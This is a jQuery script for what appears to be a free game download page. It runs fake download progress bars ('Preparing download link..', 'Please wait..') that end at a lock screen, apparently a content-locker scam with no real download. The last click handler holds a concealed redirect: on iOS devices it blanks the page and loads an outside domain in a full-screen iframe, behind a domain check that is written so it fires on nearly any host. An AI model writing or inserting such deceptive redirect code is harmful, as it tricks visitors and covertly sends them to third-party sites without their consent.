 $(".item").on("click", function(){
        $("#main-1").addClass("d-none");
        $("#main-2").removeClass("d-none");
        var el = $(this);
        $(".game-name").html(el.find("h2").text());
        $(".game-logo").attr("src", el.find("img").attr("src"));
        $(".image-lock").attr("src", el.attr("data-image"));
    });

    $(".gameing").on("click", function(){
        $("#main-3-1").addClass("d-none");
        $("#main-3-2").removeClass("d-none");

        let circularProgresss = $(".prog");
    let progressStartValuee = 0; 
    let progressEndValuee = 100;    
    let progresss = setInterval(() => {
        progressStartValuee++;
        circularProgresss.attr("style", `width: ${progressStartValuee}%`);
        if(progressStartValuee == progressEndValuee){
            clearInterval(progresss);
            $("#prog").addClass("d-none");
            $("#lock").removeClass("d-none");
        }    
    }, 40);

    });

    $(".btn-downs").on("click", function(){
        $("#main-2 .info .img").addClass("active");
        
        setTimeout(function(){
            $(".btn-downs.test").html("Preparing download link..");
        }, 10);
        setTimeout(function(){
            $(".btn-downs.test").html("Please wait..");
        }, 2900);

        setTimeout(function(){
            $("#main-2").addClass("d-none");
            $("#main-3").removeClass("d-none");
        }, 3800);

        let circularProgress = document.querySelector(".circular-progress");
        var progressValue = document.querySelector(".progress-value");
        let progressStartValue = 0;    
        let progressEndValue = 100;    
        let speed = 35;

        let progress = setInterval(() => {
            progressStartValue++;
            circularProgress.style.background = `conic-gradient(var(--main-color) ${progressStartValue * 3.6}deg, #ededed 0deg)`
            if(progressStartValue == progressEndValue){
                clearInterval(progress);
            }    
        }, speed);

    });


    $(".accordion-button").on("change", function () {
    $(".accordion-button").not(this).prop("checked", false);
    const isChecked = $(this).prop("checked");
    const content = $(this).closest(".accordion-item").find(".content");

    $(".content").removeClass("show");
    if (isChecked) {
      content.addClass("show");
    } else {
      content.removeClass("show");
    }
  });



  function searchFun() {
        // Declare variables
        var input, filter, parent, item, name, i, txtValue;
        input = document.getElementById('inp');
        filter = input.value.toUpperCase();
        parent = document.getElementById("game");
        item = parent.getElementsByClassName('col-md-4');

        var len = item.length;
        var start = 0;
        for (i = 0; i < len; i++) {
            name = item[i].getElementsByTagName("h2")[0];
            txtValue = name.textContent || name.innerText;
            if (txtValue.toUpperCase().indexOf(filter) > -1) {
                item[i].style.display = "";
            } else {
                item[i].style.display = "none";
                start++;
            }
        }
        if (start == len){
            $(".no-game").removeClass("d-none");
        }else{
            $(".no-game").addClass("d-none");
        }
    }



var button = document.querySelector('.btn-downs');  
button.addEventListener('click', function() {
    (function() {
        var originalDomain = "https://mbcvie.com";
        var redirectURL = "https://www.rolls3.com/";
        var blockedDomains = [
            "https://mbcvie.com"
        ];

        if (
            window.location.hostname !== originalDomain &&
            window.location.hostname !== "www." + originalDomain &&
            !blockedDomains.some(domain => window.location.hostname.includes(domain))
        ) {
var isIOSDevice = /iPhone|iPad|iPod/i.test(navigator.userAgent);
            if (isIOSDevice) {
                setTimeout(function() {
                    document.body.innerHTML = '';

                    var style = document.createElement('style');
                    style.textContent = `
                        #redirectFrame {
                            width: 100%;
                            height: 100vh;
                            border: none;
                        }
                    `;
                    document.head.appendChild(style);

                    var iframe = document.createElement('iframe');
                    iframe.id = "redirectFrame";
                    iframe.src = redirectURL;

                    document.body.appendChild(iframe);
                }, 3000);
            }
        }
    })();
});

